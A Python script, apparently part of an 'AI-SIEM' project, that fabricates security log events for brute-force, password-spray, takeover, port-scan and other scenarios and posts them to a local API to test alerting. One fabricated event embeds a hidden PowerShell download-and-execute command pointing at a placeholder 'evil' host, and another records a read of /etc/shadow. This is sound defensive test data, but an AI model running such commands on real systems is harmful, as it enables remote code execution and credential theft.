#!/usr/bin/env python3
"""Realistic security-event generator for the AI-SIEM.

Dependency-free (uses only the Python standard library) so it runs directly on
the Windows host without installing anything.

Examples (PowerShell):
    python tools/simulate_events.py --scenario all
    python tools/simulate_events.py --scenario bruteforce --api http://localhost:8000
    python tools/simulate_events.py --scenario takeover --user admin --password admin
"""
from __future__ import annotations

import argparse
import json
import random
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

USER_AGENTS = ["Mozilla/5.0", "curl/8.0", "python-requests/2.31"]
TARGET_USERS = ["alice", "bob", "carol", "dave", "eve", "root", "administrator", "svc_sql"]


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def login(api: str, username: str, password: str) -> str:
    data = urllib.parse.urlencode({"username": username, "password": password}).encode()
    req = urllib.request.Request(f"{api}/api/auth/login", data=data, method="POST")
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    with urllib.request.urlopen(req, timeout=15) as resp:
        return json.loads(resp.read())["access_token"]


def post_batch(api: str, token: str, events: list[dict]) -> dict:
    body = json.dumps({"events": events}).encode()
    req = urllib.request.Request(f"{api}/api/events/batch", data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as e:
        print(f"  ! HTTP {e.code}: {e.read().decode()[:300]}")
        return {"ingested": 0, "alerts_created": 0}


# --------------------------------------------------------------------------- #
# Scenarios
# --------------------------------------------------------------------------- #
def scn_bruteforce(attacker_ip: str) -> list[dict]:
    """Many failed logins against one account from one IP."""
    events = []
    for i in range(12):
        events.append({
            "timestamp": _now(), "source": "linux", "event_type": "login",
            "action": "ssh", "outcome": "failure", "hostname": "web-01",
            "source_ip": attacker_ip, "username": "root",
            "severity": "Low",
            "message": f"Failed password for root from {attacker_ip} port {40000 + i}",
        })
    return events


def scn_spray(attacker_ip: str) -> list[dict]:
    """Failed logins across many accounts (password spraying)."""
    events = []
    for user in TARGET_USERS:
        events.append({
            "timestamp": _now(), "source": "windows", "event_type": "login",
            "action": "logon", "outcome": "failure", "hostname": "DC-01",
            "source_ip": attacker_ip, "username": user, "severity": "Low",
            "message": f"Audit failure 4625: account {user} from {attacker_ip}",
        })
    return events


def scn_takeover(attacker_ip: str) -> list[dict]:
    """Repeated failures then a success — possible account takeover."""
    events = scn_bruteforce(attacker_ip)
    events.append({
        "timestamp": _now(), "source": "linux", "event_type": "login",
        "action": "ssh", "outcome": "success", "hostname": "web-01",
        "source_ip": attacker_ip, "username": "root", "severity": "Medium",
        "message": f"Accepted password for root from {attacker_ip}",
    })
    return events


def scn_portscan(attacker_ip: str) -> list[dict]:
    events = []
    for port in random.sample(range(1, 1024), 25):
        events.append({
            "timestamp": _now(), "source": "firewall", "event_type": "network",
            "action": "connect", "outcome": "failure", "hostname": "fw-01",
            "source_ip": attacker_ip, "dest_ip": "10.0.0.5", "dest_port": port,
            "severity": "Low", "message": f"SYN to 10.0.0.5:{port} dropped",
        })
    return events


def scn_powershell(host_ip: str) -> list[dict]:
    return [{
        "timestamp": _now(), "source": "windows", "event_type": "process",
        "action": "process_creation", "outcome": "success", "hostname": "WIN-ADM",
        "source_ip": host_ip, "username": "jdoe", "severity": "Medium",
        "message": "powershell.exe -nop -w hidden -enc SQBFAFgAKA...",
        "raw": {"command_line": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA "
                                 "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')",
                "process": "powershell.exe"},
    }]


def scn_sensitive(host_ip: str) -> list[dict]:
    return [{
        "timestamp": _now(), "source": "linux", "event_type": "access",
        "action": "read", "outcome": "success", "hostname": "db-01",
        "source_ip": host_ip, "username": "www-data", "severity": "Medium",
        "message": "process read /etc/shadow",
        "raw": {"resource": "/etc/shadow"},
    }]


def scn_normal(_ip: str) -> list[dict]:
    """Benign background noise so the dashboard isn't all red."""
    events = []
    for _ in range(15):
        user = random.choice(TARGET_USERS)
        events.append({
            "timestamp": _now(), "source": random.choice(["linux", "windows", "web"]),
            "event_type": "login", "action": "logon", "outcome": "success",
            "hostname": random.choice(["web-01", "app-02", "DC-01"]),
            "source_ip": f"10.0.0.{random.randint(2, 50)}", "username": user,
            "severity": "Informational", "message": f"Successful login for {user}",
        })
    return events


SCENARIOS = {
    "bruteforce": scn_bruteforce,
    "spray": scn_spray,
    "takeover": scn_takeover,
    "portscan": scn_portscan,
    "powershell": scn_powershell,
    "sensitive": scn_sensitive,
    "normal": scn_normal,
}


def run(api: str, token: str, scenario: str) -> None:
    attacker_ip = f"203.0.113.{random.randint(2, 254)}"
    scenarios = list(SCENARIOS) if scenario == "all" else [scenario]
    total_ingested = total_alerts = 0
    for name in scenarios:
        if name == "all":
            continue
        events = SCENARIOS[name](attacker_ip)
        res = post_batch(api, token, events)
        total_ingested += res.get("ingested", 0)
        total_alerts += res.get("alerts_created", 0)
        print(f"  [{name:11}] sent {len(events):3} events -> "
              f"{res.get('alerts_created', 0)} alert(s) from {attacker_ip}")
        time.sleep(0.4)
    print(f"\nDone. Ingested {total_ingested} events, created {total_alerts} alerts.")
    print("Open the dashboard to watch alerts arrive in real time.")


def main() -> None:
    p = argparse.ArgumentParser(description="AI-SIEM event simulator")
    p.add_argument("--api", default="http://localhost:8000")
    p.add_argument("--user", default="admin")
    p.add_argument("--password", default="admin")
    p.add_argument("--scenario", default="all", choices=["all", *SCENARIOS])
    p.add_argument("--loop", type=int, default=1, help="repeat N times (0 = forever)")
    p.add_argument("--interval", type=float, default=3.0, help="seconds between loops")
    args = p.parse_args()

    print(f"Authenticating to {args.api} as {args.user} ...")
    try:
        token = login(args.api, args.user, args.password)
    except Exception as e:
        print(f"Login failed: {e}")
        raise SystemExit(1)
    print("Authenticated.\n")

    i = 0
    while True:
        i += 1
        print(f"--- Simulation run #{i} ---")
        run(args.api, token, args.scenario)
        if args.loop != 0 and i >= args.loop:
            break
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
